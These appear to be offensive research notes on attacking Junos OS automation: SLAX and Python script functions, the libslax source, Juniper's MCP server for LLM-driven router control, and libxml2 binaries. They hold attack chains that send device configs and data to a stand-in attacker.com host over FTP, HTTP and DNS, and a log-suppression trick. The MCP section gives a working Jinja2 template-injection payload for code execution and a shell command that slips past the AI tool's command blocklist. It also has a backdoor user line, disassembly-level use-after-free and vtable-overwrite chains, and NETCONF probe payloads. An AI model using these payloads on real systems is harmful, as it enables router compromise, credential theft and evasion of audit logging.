# Junos Automation Layer Attack Surface
## Source: Junos OS Automation Scripting User Guide (2026-06-16 revision)
## Pages surveyed: 341-415

---

## Runtime Architecture

```
CLI / NETCONF / SNMP
        |
        v
   mgd daemon (management daemon)
        |
        +-- libslax (SLAX/XSLT runtime, wraps libxslt)
        |       |
        |       +-- jcs namespace (commit-scripts/1.0)
        |       +-- slax namespace (xml.libslax.org/slax)
        |       +-- curl, db, os, xutil extensions
        |
        +-- Python scripts (run as root)
        |
        v
   /var/db/scripts/{op,commit,event}/   <- writable script store
```

Script execution context: root privilege on FreeBSD kernel. SLAX runs inside `mgd`; Python scripts fork as root.

---

## Function Inventory — Attack Surface Classification

### CRITICAL: Code / Expression Injection

**`slax:evaluate(expression)` — p.376**
```slax
object slax:evaluate(expression);
// example:
var $result = slax:evaluate("expr[name == '&']");
```
- Evaluates arbitrary SLAX expression string at runtime
- If `expression` derives from NETCONF param or CLI arg: **SLAX code injection in mgd context**
- Can chain: `slax:evaluate("slax:document('http://attacker.com/payload')")`
- Introduced SLAX 1.1

**`jcs:invoke(rpc, "no-login-logout")` — p.402**
```slax
var $result = jcs:invoke(rpc, "no-login-logout");
// example:
var $sw = jcs:invoke('get-software-information');
```
- Executes any Junos XML API RPC on the **local device as root**
- `rpc` parameter: string or XML tree — if constructed from unsanitized input, **XML injection → arbitrary RPC**
- `no-login-logout` flag (added 21.1R1): **suppresses UI_LOGIN_EVENT and UI_LOGOUT_EVENT in syslog**
  - Built-in log evasion. Script executes as root with no audit trail.
- Attack chain: NETCONF param → $rpc variable → jcs:invoke($rpc)
- Introduced 7.6

**`jcs:execute(connection, rpc)` — p.377**
```slax
var $result = jcs:execute($connection, $rpc);
```
- Executes RPC on remote device over existing session
- Multiple RPCs reuse same session handle
- `rpc` controllable → arbitrary RPC on remote target
- Credentials for session commonly hardcoded in script file

### CRITICAL: SSRF / Network Reach

**`jcs:open(remote-hostname, username, passphrase, routing-instance-name)` — p.406**
```slax
// No-arg: local junoscript session
var $connection = jcs:open();
// Remote: SSH to arbitrary host
var $connection = jcs:open(remote-hostname, username, passphrase);
// Full session-options form:
var $session-options := {
    <method> "netconf";          // junoscript | netconf | junos-netconf
    <username> "admin";
    <passphrase> "test123";      // plaintext credential in script
    <port> "830";                // configurable port
    <routing-instance> "name";   // VRF selection for egress
}
var $connection = jcs:open(remote-hostname, $session-options);
```
- Opens SSH session to **attacker-controlled hostname** if param is unsanitized
- `passphrase` in plaintext as function argument — stored in `/var/db/scripts/op/*.slax`
- `routing-instance` → SSH can originate from any configured VRF (lateral movement across routing domains)
- `<port>` configurable → not limited to 830/22
- Introduced 9.3; NETCONF session support 11.4

**`slax:document(url, options)` — p.364 (confirmed prior session)**
- Reads file path OR URL
- No URL scheme restriction documented
- `slax:document("file:///etc/passwd")` — local file read
- `slax:document("http://attacker.com/")` — outbound HTTP
- Caches on first read — persistent SSRF

**`slax:get-host(address)` — p.387**
```slax
var $result = slax:get-host(address);
```
- DNS lookup for hostname, IPv4, or IPv6 — queries configured DNS server
- `address` from NETCONF input → **DNS-based exfiltration channel** (data encoded in hostname)
- Returns XML node set with `<hostname>`, `<address>`, `<alias>`
- Introduced SLAX 1.3

**`jcs:hostname(address)` — p.400**
```slax
var $name = jcs:hostname(address);
// Python: name = jcs.hostname(address)
```
- Reverse DNS lookup — same exfiltration surface as get-host
- Introduced 7.6; Python 16.1R1

### HIGH: Credential Exposure

**`jcs:get-secret(string)` — p.394**
```slax
var $password = jcs:get-secret("Enter password: ");
// Python: password = jcs.get_secret("Enter password")
```
- Silent CLI prompt (no echo)
- Returns plaintext string into script variable
- Captured credentials live in mgd process memory during execution
- If script is injectable, can redirect get-secret output to attacker-controlled connection

**Plaintext credential pattern in scripts:**
```slax
// Documented example, p.379:
var $connection = jcs:open('198.51.100.1', 'bsmith', 'test123');
// Scripts at /var/db/scripts/op/ are world-readable by default
```
- Script files at `/var/db/scripts/op/` contain hardcoded credentials
- File read access → credential harvest

### HIGH: NETCONF URL Capability

**`jcs:get-hello(connection)` — p.384-386**

Documented capability advertisement from a Junos NETCONF session:
```
urn:ietf:params:xml:ns:netconf:capability:url:1.0?protocol=http,ftp,file
```
- NETCONF `<copy-config>` accepts URL source/target with **http, ftp, file** protocols
- Config exfiltration: `<copy-config><source><url>running://</url></source><target><url>ftp://attacker.com/stolen.xml</url></target>`
- Lateral push: `<copy-config><source><url>http://attacker.com/malicious.xml</url></source><target><candidate/></target>`
- Introduced 11.4

### MEDIUM: SNMP Script Attack Surface

**`jcs.get_snmp_action()` / `jcs.get_snmp_oid()` — p.396-399**
```python
import jcs
snmp_action = jcs.get_snmp_action()   # 'get' | 'get-next' | 'set'
snmp_oid    = jcs.get_snmp_oid()      # e.g. '1.3.6.1.4.1.2636.13.61.1.9.1.1.1'
```
- Python SNMP scripts run as root
- OID string passed directly from SNMP request to script
- Action-based branching on the OID value — OID is attacker-controlled in SNMP context
- Introduced 16.1R1

**`jcs.get_input(string)` — p.389-391**
- Python: `username = jcs.get_input("Enter login id: ")`
- Null character in prompt string (`\0`) → `Invalid number of arguments` error in Python scripts
- **DoS via null byte injection** in non-interactive SNMP/event script context
- Introduced 9.4; Python 16.1R1

### LOW: String Construction Helpers (useful for injection chaining)

**`slax:join(separator, string1, string2 ...)` — p.404**
```slax
// Documented example constructs /var/db/scripts/op:
var $path = slax:join("/", "/var", "db", "scripts", "op");
```
- Useful for constructing file paths and URLs from components
- Can build arbitrary paths from partial user-controlled fragments

---

## Attack Chains

### Chain 1: NETCONF Input → Arbitrary RPC (root)
```
Attacker sends NETCONF <edit-config> with <interface-name> param
  containing XML metacharacters: </interface-name><get-system-users/>
→ SLAX script builds $rpc tree from unsanitized $interface
→ jcs:invoke($rpc)
→ Arbitrary RPC executed as root on local device
→ jcs:invoke($rpc, "no-login-logout") → no syslog audit trail
```
**Requires:** Script that passes NETCONF param to jcs:invoke without sanitization.

### Chain 2: NETCONF Input → Remote SSRF via jcs:open()
```
NETCONF param: $target = "attacker.com"
Script: var $conn = jcs:open($target, "admin", $password)
→ SSH connection from Junos device to attacker.com:22
→ Attacker captures: SSH client version, host key fingerprint, username
→ If $password also from NETCONF input: full credential exfiltration over SSH
→ jcs:execute($conn, <get-route-information/>) → attacker controls RPC response
```
**Routing instance param → exfiltration from non-default VRF.**

### Chain 3: SLAX Dynamic Evaluation → Full Extension Access
```
NETCONF param: $expr = "slax:document('http://attacker.com/c2')"
Script: var $r = slax:evaluate($expr)
→ mgd makes outbound HTTP request to attacker C2
→ C2 responds with SLAX expression: "jcs:invoke('request-shell-execute')"
→ Shell execution as root (if RPC exposed)
```
**One param + slax:evaluate → full script runtime compromise.**

### Chain 4: NETCONF URL Capability → Config Exfiltration
```
Authenticated NETCONF session (any user with netconf access):
<copy-config>
  <source><running/></source>
  <target><url>ftp://attacker.com/device-config.xml</url></target>
</copy-config>
→ Complete running config (including password hashes) sent to attacker FTP
```
**Auth required but low-privilege NETCONF user sufficient. No script needed.**

### Chain 5: Script File Read → Credential Harvest
```
/var/db/scripts/op/ accessible with file read (local or via slax:document())
→ *.slax files contain: jcs:open("router1", "admin", "test123")
→ Plaintext service account credentials for lateral movement to adjacent devices
```

### Chain 6: DNS Exfiltration via slax:get-host()
```
NETCONF param: $data = <b64-encoded-data>.attacker.com
Script: slax:get-host($data)
→ DNS query to attacker nameserver with data in label
→ Exfiltrate arbitrary data over DNS (bypasses HTTP proxy controls)
```

---

## Log Evasion

`jcs:invoke(rpc, "no-login-logout")` suppresses:
- `UI_LOGIN_EVENT`
- `UI_LOGOUT_EVENT`

This is a **vendor-documented log suppression parameter** added in Junos OS Release 21.1R1. Scripts using this flag execute as root with RPC results but without auth event log entries. Commit and event scripts only (not op scripts).

---

## Writable Paths

| Path | Content | Risk |
|------|---------|------|
| `/var/db/scripts/op/` | Op scripts (run on demand) | Plaintext creds; if writable = persistence |
| `/var/db/scripts/commit/` | Commit scripts (run on every commit) | Writable = root exec on every config change |
| `/var/db/scripts/event/` | Event scripts (triggered by syslog events) | Writable = trigger-based root exec |
| `/var/run/` | jcs:dampen() state files | Low-privilege write, timing oracle |

---

## Functions Confirmed NOT Yet Analyzed (still pending)

| Function | Page | Priority |
|----------|------|----------|
| `jcs:sleep()` | 427 | Low |
| `jcs:sysctl()` | 431 | Medium (kernel parameter read) |
| `jcs:syslog()` | 433 | Medium (log injection) |
| `jcs:trace()` | 438 | Low |
| Remote script source | 469 | CRITICAL (supply chain) |
| libslax curl extension | 218 | HIGH (HTTP client) |

---

---

## Source RE — libslax Confirmations

Cloned: `github.com/Juniper/libslax` (depth=1, 2026-08-30)

### `slaxExtEvaluate` — libslax/slaxext.c:2852-2884

```c
str = xmlXPathPopString(ctxt);
// SLAX-to-XPath translation (syntactic only, no value sanitization)
sexpr = slaxSlaxToXpath("slax:evaluate", 1, (const char *) str, &errors);
// Direct eval — no sandbox, no expression restrictions
ret = xmlXPathEval((const xmlChar *) sexpr, ctxt->context);
```

`slaxSlaxToXpath` converts SLAX syntax to XPath. It does NOT sanitize or restrict
what the expression can access. `xmlXPathEval()` has full document tree access.
If `str` comes from NETCONF input, Chain 3 is confirmed at source level.

### `ext_os` — extensions/os/ext_os.c:1339-1384

OS extension functions available from any SLAX script running as root in mgd:

| Function | Signature | Impact |
|----------|-----------|--------|
| `os:mkdir` | `(path)` | Create arbitrary directories |
| `os:stat` | `(file-spec)` | Stat any file — filesystem enumeration |
| `os:remove` | `(filespec, ...)` | Delete arbitrary files |
| `os:chmod` | `(permissions, filespec, ...)` | Change permissions on any file |
| `os:chown` | `(ownership, file-spec, ...)` | Change ownership |
| `os:user-info` | `()` | Current process user info |
| `os:exit-code` | `(number)` | Set process exit code |

All run in mgd context = root. `os:remove` + `os:chmod` = file-based privilege
escalation primitives from any injectable SLAX script.

---

## Junos MCP Server — `github.com/Juniper/junos-mcp-server`

Official Juniper-published MCP server for LLM-to-router interaction. FastMCP
framework, PyEZ backend. 9 tools. Analyzed 2026-08-30.

### CRITICAL: Jinja2 SSTI → RCE on MCP Host

**File:** `jmcp.py:1352-1358`

```python
env = Environment(
    trim_blocks=True,
    lstrip_blocks=True,
    autoescape=False,          # no HTML escaping
    undefined=StrictUndefined,
)
rendered_config = env.from_string(template_content).render(variables)
```

`template_content` is supplied directly by the MCP client (LLM). No sandbox.
Standard `Environment()`, not `SandboxedEnvironment`. Exploitable before
`apply_config` check — render-only mode is sufficient.

**PoC (no router required):**
```
tool: render_and_apply_j2_template
template_content: "{{ ''.__class__.__mro__[2].__subclasses__()[128].__init__.__globals__['system']('id') }}"
vars_content: "x: 1"
apply_config: false
```

**Impact:** RCE on the host running the MCP server. If the server is co-located
with device credentials in `devices.json`, this becomes full device compromise
with no NETCONF/SSH authentication needed.

### CRITICAL: `execute_junos_command` shell bypass

**File:** `block.cmd` — 5 blocked patterns:
```
request system reboot
request system halt
request system power-cycle
request system power-off
request system zeroize
```

NOT blocked: `request system shell`, `file show /etc/master.passwd`,
`request routing-engine login`, PFE commands, any `show` command.

**PoC:**
```json
{"router_name": "r1", "command": "request system shell command \"id\""}
```

Root shell on FreeBSD Junos device.

### CRITICAL: `execute_junos_pfe_command` — no blocklist

`_run_junos_pfe_command` calls `junos_device.rpc.request_pfe_execute(target, command)`
with no blocklist check. PFE commands execute below the OS on the packet forwarding
ASIC. Can dump FIB, modify forwarding tables, access ASIC memory.

### HIGH: `get_junos_config` — full config disclosure

Hardcoded command: `show configuration | display inheritance no-comments | display set | no-more`

Returns complete device configuration including plaintext password hashes to any
authenticated MCP client. No access scoping.

### HIGH: `block.cfg` incomplete — user persistence

Blocked: `set system root-authentication`, `set system login user ([^ ]+) authentication`

NOT blocked: `set system login user BACKDOOR class super-user` (adds user without auth =
SSH key injection path if user subsequently sets their key via unblocked command path).

### Token storage

Default token file: `.tokens` in server working directory. Format documented in
README. If world-readable (Docker default volumes), provides MCP API access.

---

## libxml2.so.3 in Junos EVO — CVE Status

Library: `libxml2.so.3` from Junos EVO 23.4R2.14 ISO initrd, not stripped.
Embedded version: `20909` = libxml2 **2.9.9**.

| CVE | Fixed in upstream | Status in 2.9.9 |
|-----|------------------|-----------------|
| CVE-2021-3541 (billion laughs) | 2.9.11 | PATCHED — Juniper backported. `xmlParserEntityCheck` at 0xef6b0: `cmp r13, 0x98967f` (10MB) + ×10 document size limit |
| CVE-2022-23308 (XInclude UAF) | 2.9.14 | **CONFIRMED UNPATCHED** — NULL guard absent at two access sites |

`xmlXIncludeDoProcess` UAF analysis (0x7b550, x86-64 ELF, not stripped):

Entry guards (present):
- `0x7b564`: `test %rsi, %rsi; je 7cddc` — doc == NULL check
- `0x7b574`: `test %rdx, %rdx; je 7cddc` — tree == NULL check
- `0x7b580`: `cmpl $0x12, 0x8(%rdx); je 7cddc` — tree->type != XML_NAMESPACE_DECL
- `0x7b58d`: `test %rdi, %rdi; je 7cddc` — ctxt == NULL check

UAF site 1 (0x7c9d4–0x7c9e6):
```
7c9d4:  test  %rbx, %rbx           ; node != NULL (guards the node pointer)
7c9d7:  je    7ca2f                 ; ← only guards node itself
7c9d9:  cmpl  $0x1, 0x8(%rbx)      ; node->type == XML_ELEMENT_NODE
7c9dd:  jne   7c9d0
7c9df:  mov   0x40(%rbx), %rdi     ; ← rdi = node->doc — NO NULL CHECK
7c9e3:  mov   %rbx, %rsi
7c9e6:  call  xmlNodeGetBase        ; xmlNodeGetBase(node->doc, node)
```
`node->doc` is loaded and passed directly to `xmlNodeGetBase` without a
`node->doc == NULL` guard. If doc was freed by a prior XInclude substitution,
this is a UAF deref.

UAF site 2 (0x7c9f7–0x7ca05):
```
7c9f7:  mov   0x40(%rbx), %rax     ; rax = node->doc (second read, no guard)
7c9fe:  mov   0x88(%rax), %rsi     ; rsi = doc->URL — deref of potentially freed doc
7ca05:  call  xmlStrEqual
```
`doc->URL` (at offset 0x88 in xmlDoc) dereferenced from a potentially-freed doc pointer.

Additional sites (r13 node, no NULL guard on doc):
  0x7c542, 0x7c6c2, 0x7cab5 — all `mov 0x40(%r13), %rdi` → `call xmlNewDocNode`

Fix in 2.9.14: adds `if (node->doc == NULL) goto out;` before 0x7c9df equivalent.
This check is absent in 2.9.9.

Trigger path in Junos context:
  NETCONF RPC → mgd XML parse → xmlXIncludeProcessFlags() called with
  XML_PARSE_XINCLUDE flag → xmlXIncludeDoProcess → UAF on freed doc pointer.
  Whether mgd enables XInclude processing by default needs validation via
  mgd binary RE (xmlXIncludeProcessFlags call sites in mgd).

`xmlLoadExtDtdDefaultValue` exported — external DTD loading compiled in.

## Juniper custom DOM API: register_* / cs_xmlXPathNext* (NULL deref + vtable overwrite)

12 Juniper-specific function pointer slots added to libxml2.so.3 (absent in upstream).
All 12 are in BSS (zero-initialized). Must be set via `register_*` before use.

Slots (BSS at 0x150b10–0x150b68):
```
0x150b10: get_first_node       0x150b48: get_next_node
0x150b18: get_all_nodeset      0x150b50: delete_nodeset
0x150b20: is_node_container    0x150b58: get_parent_node
0x150b28: get_ref_node         0x150b60: get_all_nodes
0x150b30: delete_node          0x150b68: delete_all_nodes
0x150b38: is_node_equal        0x150b40: get_child_node
```

Registration functions (3 instructions each — no type checking, no atomicity):
```asm
register_get_first_node(fn):
  mov  [rip + GOT_offset], rax   ; load &get_first_node slot
  mov  rdi, [rax]                ; *slot = fn
  ret
```

Call sites WITHOUT NULL checks (confirmed unchecked dereferences):

`cs_xmlXPathNextChildElement` (0x81870):
  0x81923: mov [get_first_node GOT], rax; call *(%rax)  ← no NULL check
  0x81938: mov [get_parent_node GOT], rax; call *(%rax) ← no NULL check

`cs_xmlXPathNextParent` (0x81700):
  0x817a8: mov [is_node_container GOT], rax; call *(%rax) ← no NULL check
  0x817bb: call *0x0(%r13)  [r13 = get_parent_node GOT]  ← no NULL check
  0x817c5: mov [delete_node GOT], rax; call *(%rax)       ← no NULL check
  0x817df: mov (%rax), %rax; jmp *%rax [get_first_node]   ← tail-call, no NULL check

Call sites WITH NULL checks (for comparison):
  0x82617: cmpq $0x0, (%rax) for get_all_nodeset ← guarded
  0x829b8: cmpq $0x0, (%rax) for get_next_node   ← guarded

Dispatch gate in xmlXPathNodeCollectAndTest (0x8fabe / 0x8fc11):
```asm
; Parent axis selection
mov  [get_next_node GOT], rax
lea  xmlXPathNextParent, rdx    ; standard (safe) path
cmpq $0, (%rax)                 ; is get_next_node NULL?
lea  cs_xmlXPathNextParent, rax ; custom (unchecked) path
cmove rdx, rax                  ; get_next_node==NULL → use standard; else use custom
```
Selection is gated on `get_next_node`. Custom path is only taken if `get_next_node != NULL`.

FINDING 1 — NULL deref (partial-registration race):
  Precondition: `register_get_next_node(fn)` has been called (switches to cs_* path),
    but at least one of {get_parent_node, is_node_container, delete_node, get_first_node}
    is still NULL.
  Attack: NETCONF filter with parent or child-element XPath axis triggers cs_* path.
  `<filter type="xpath" select="//parent::*/child::element()">` →
    xmlXPathNodeCollectAndTest → takes cs_* branch (get_next_node != NULL) →
    cs_xmlXPathNextParent calls get_parent_node (unchecked) → NULL deref → crash.
  Window: partial registration state between any two register_* calls is exploitable
    if an XPath query arrives during that window.

FINDING 2 — vtable overwrite (RCE):
  BSS slots at deterministic offsets per binary version.
  Overwrite any of the 5 unchecked slots (get_parent_node, is_node_container,
  delete_node, get_first_node + tail-call, delete_node via cs_xmlXPathNextParent)
  with attacker-controlled address.
  Trigger: NETCONF XPath filter with parent/child-element axis (requires get_next_node
  to be registered to take the cs_* path).
  Chain: libnetconf2 F1 (heap spray to shape layout) + F9 (OOB heap write to
    overwrite BSS slot) + F2 (optional TOCTOU for slot alignment) →
    arbitrary code execution on next XPath axis traversal.
  Note: BSS is not adjacent to heap — chain requires heap-to-BSS bridge
    (needs a separate primitive or ASLR info leak first).

---

## libslax source RE — slax:* extension attack surface

Source: github.com/Juniper/libslax (open-source SLAX runtime).
Registration: slaxExtRegister() at slaxext.c:3764 registers all slax:* functions.

FINDING S1 — slax:evaluate → arbitrary XPath injection (slaxext.c:2862)
  ```c
  sexpr = slaxSlaxToXpath("slax:evaluate", 1, (const char *) str, &errors);
  ret = xmlXPathEval((const xmlChar *) sexpr, ctxt->context);
  ```
  `str` = first argument, popped from XPath context stack. If a SLAX script passes
  a NETCONF RPC parameter directly: `var $r = slax:evaluate($rpc-param);`
  → attacker controls the XPath expression evaluated against the current document.
  Current document during NETCONF processing = parsed running config + RPC payload.
  XPath extraction: `//configuration/system/login/user/authentication/ssh-rsa`
  → reads SSH keys, passwords, RADIUS secrets from running config.
  No sandboxing between the injected expression and the config document tree.

FINDING S2 — slax:document → LFI/SSRF (slaxext.c:3203)
  ```c
  filename = xmlXPathPopString(ctxt);   // attacker-controlled
  input = xmlParserInputBufferCreateFilename((char *) filename, sdo.sdo_encoding);
  ```
  `xmlParserInputBufferCreateFilename` accepts any URI that libxml2 supports:
  `file://`, `http://`, `ftp://`, `compress://`, etc.
  If `filename` flows from NETCONF RPC parameter → arbitrary local file read or SSRF.
  On Junos: `file:///var/etc/shadow`, `file:///etc/passwd`, `file:///config/juniper.conf`.
  `http://internal-host/path` → SSRF against management-plane reachable hosts.
  No URI scheme filtering or path restriction.

FINDING S3 — slax:sysctl → unbounded alloca stack overflow (slaxext.c:2108)
  ```c
  size_t size = 0;
  sysctlbyname((char *) name, NULL, &size, NULL, 0);  // kernel sets size
  char *buf = alloca(size + 1);                        // NO BOUND CHECK
  ```
  `name` = sysctl variable name (attacker-controlled if from NETCONF RPC param).
  `size` from kernel is unbounded. Large sysctl variables on an active router:
    kern.file:           ~500KB (all open FDs)
    net.inet.tcp.pcblist: ~10MB on a busy SRX
  `alloca(10MB)` → stack pointer past guard page → SIGSEGV → DoS.
  Secondary: sysctl read oracle — can read any sysctl accessible to mgd uid.

SLAX injection trigger path:
  NETCONF RPC → mgd → operational/event script invocation → SLAX script execution
  → libslax processes `slax:evaluate($param)` / `slax:document($param)` →
  XPath injection / LFI / SSRF.
  Whether shipped Junos scripts pass RPC params directly to these functions
  requires mgd binary RE (not available in this layer).

## Binary RE Targets (automation layer)

Functions in libslax: slaxExtRegister, slaxExtEvaluate, slaxExtDocument, slaxExtSysctl
Functions in mgd (closed): jcs_execute_rpc, jcs_open_connection, slax_document_fetch
libxslt.so: xmlXPathEval (called by slaxExtEvaluate — XPath evaluation engine)

---

## NETCONF Error Response Reflection (mgd)

**Attack surface:** `<rpc-error>` responses from mgd reflect user-controlled fields
back to the caller. Two fields are direct input echoes:

- `<bad-element>` — copied from the offending XML element name in the user's RPC.
  Source: mgd reads the tag name from the parsed XML node and writes it into the
  error reply. No namespace stripping on Junos; full prefixed name is reflected.
- `<error-path>` — config hierarchy path, partially derived from user-supplied
  path in edit-config/get-config requests.

**Injection vectors:**
1. **XML entity injection via bad-element**: Send an RPC with element names
   containing XML metacharacters (e.g., `<foo&bar>`, `</foo>`). If mgd constructs
   `<bad-element>` by string concatenation rather than xmlWriter, entity injection
   lands in the response stream. Downstream tools parsing the response without
   sanitization get malformed XML.
2. **XXE via error-path**: If edit-config requests with XPath-like path expressions
   are reflected into `<error-path>` without escaping, an attacker controlling the
   config path string could inject XML entities into operator tooling that consumes
   the NETCONF session.
3. **Buffer sizing in bad-element construction**: mgd likely has a fixed format
   string for error responses. If `bad-element` content exceeds that buffer and
   mgd uses `snprintf` with the element name length, the truncation point is a
   crash oracle for length limits in mgd's XML output path.

**RFC 6241 §4.3 constraint**: `<bad-element>` MUST contain the element's
*decoded name* (NCName or QName), not raw XML bytes. A compliant implementation:
  libxml2 parse → decoded node name → `error-info/bad-element` → re-serialized
RFC-compliant mgd: entity-encoded input (`&amp;`) → decoded (`&`) stored in
node name → re-escaped (`&amp;`) on output. No injection from this path.

**The actual injection surface is the shortcut path:**
  `xmlGetLastError()->str1` — libxml2's error string, copied from raw input
  buffer BEFORE entity decoding. If mgd sources `<bad-element>` from
  `xmlGetLastError()->str1` rather than from the parsed node name, raw
  input bytes land in the output stream. The shortcut is common in fast
  error-path code where parse failed before a valid node was created.

**Distinguishing the two paths (test vectors for `netconf_reflect.py`):**
  Payload `foo&amp;bar` → RFC-compliant: reflects `foo&amp;bar`
                       → shortcut path: reflects `foo&amp;bar` (same here)
  Payload `foo&bar`    → RFC-compliant: XML parse error; node never created;
                         mgd may fall back to `str1` → reflects `foo&bar`
                       → shortcut path: also reflects `foo&bar`
  The distinguishing case: after a valid-XML-but-invalid-config RPC
  (parse succeeds, mgd rejects the config element), the node exists:
  Payload `foo&amp;bar` as element name in valid XML context:
    → RFC path (decoded name): stores `foo&bar` → reflects `foo&amp;bar`
    → shortcut from raw input: stores `foo&amp;bar` → reflects `foo&amp;bar`
  Use `entity_ref` probe (`foo&amp;bar`) with a syntactically VALID RPC
  (valid XML that mgd will reject at config layer, not parse layer) to
  distinguish. `REFLECTED_TRANSFORMED` result = RFC path. `REFLECTED_EXACT`
  = shortcut, raw-bytes injection surface confirmed.

**Test approach (controlled env only):**
```xml
<!-- Send RPC with long element name (>256 bytes) to probe truncation -->
<rpc xmlns="urn:ietf:params:xml:ns:netconf:base:1.0">
  <edit-config>
    <target><candidate/></target>
    <config>
      <AAAAAAAAAA...256xA.../>
    </config>
  </edit-config>
</rpc>

<!-- XML entity injection test -->
<rpc xmlns="urn:ietf:params:xml:ns:netconf:base:1.0">
  <edit-config>
    <target><candidate/></target>
    <config>
      <configuration>
        <system>
          <invalid&amp;element/>
        </system>
      </configuration>
    </config>
  </edit-config>
</rpc>
```

**Binary RE target in mgd**: Look for the function that writes `<bad-element>` to
the NETCONF output stream. Likely calls `xmlTextWriterWriteElement` or
`xmlOutputBufferWrite` with the element name as a `const char*` argument. The
copy path between `xmlGetLastError()->str1` (bad element name, set by libxml2
parser) and the NETCONF response write is the target region.
